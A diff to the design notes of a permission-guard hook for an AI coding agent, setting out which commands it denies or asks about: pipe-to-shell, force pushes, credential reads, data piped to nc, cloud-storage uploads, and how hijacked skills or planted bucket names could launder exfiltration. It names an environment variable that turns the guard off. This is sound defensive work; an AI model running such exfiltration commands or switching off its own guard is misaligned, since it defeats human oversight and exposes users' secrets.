@@ -60,18 +60,22 @@ dependency**. No ML models, no services, no Docker.
      an approve dialog) covers the dual-use and scope cases: pipe-to-shell and
      `git push --force` (not `--force-with-lease`, allowed), writes outside the project
      root (temp/plan files exempt via `is_plan_file`), credential-shaped reads, named
-     installs, deep-system-dir deletes, data piped into a raw socket (`… | nc`), a
-     cloud-storage upload to an unrecognized bucket (`aws s3 cp`/`gsutil`/`az blob`), and a
-     credential-named URL download. The `_deny` reason text must not tell the model to
-     "proceed on confirmation" — it can't; it points to the real escape hatches (run it
-     yourself / `CLAW_NO_ACCESS_GUARD=1`). Data-bearing network egress AND cloud uploads
-     are **provenance-tiered**: `value_in_project` searches the destination host/bucket
-     across the project's own text files — a bounded walk that EXCLUDES `.claude/` so a
-     hijacked skill can't launder a host into "trusted", 15-min verdict cache — endogenous
-     (in the repo) → allow/ask, absent → ask (or deny for the inline-capture shape). Asks
-     once **per destination** per session: for egress the dedup key is the host/bucket
-     (`_egress_targets`), not the exact command, so iterating upload payloads to one host
-     asks once; other tiers key on the path/command. Keys are sha256-hashed so raw command
+     installs, deep-system-dir deletes, data piped into a raw socket (`… | nc`), **any**
+     cloud-storage upload (`aws s3 cp`/`gsutil`/`az blob`), and a credential-named URL
+     download. The `_deny` reason text must not tell the model to "proceed on
+     confirmation" — it can't; it points to the real escape hatches (run it yourself /
+     `CLAW_NO_ACCESS_GUARD=1`). **Data-bearing curl/scp egress is provenance-tiered**:
+     `value_in_project` searches the destination host across the project's own text files
+     — a bounded walk that EXCLUDES `.claude/` so a hijacked skill can't launder a host
+     into "trusted", 15-min verdict cache — endogenous (in the repo) → ask, absent → ask
+     (or deny for the inline-capture shape). Note a known host still ASKS for a data
+     upload; provenance only flips the inline-capture case between deny and ask, so it can
+     never buy a *silent* egress. **Cloud uploads are deliberately NOT provenance-downgraded
+     to allow** — source is forgeable (a rogue postinstall or injected Write could plant a
+     bucket name), so `aws s3 cp <secret> s3://planted-bucket` would be silent exfil; every
+     cloud upload asks once per bucket instead. Asks once **per destination** per session:
+     for egress the dedup key is the host/bucket (`_egress_targets`), not the exact command,
+     so iterating upload payloads to one host asks once; other tiers key on the path/command. Keys are sha256-hashed so raw command
      text never touches disk. **Two-phase**: PreToolUse records a target `pending`; a
      PostToolUse companion (same matcher) promotes it to `confirmed` only once the call
      actually completes AND the payload carries a `tool_response` (execution evidence —
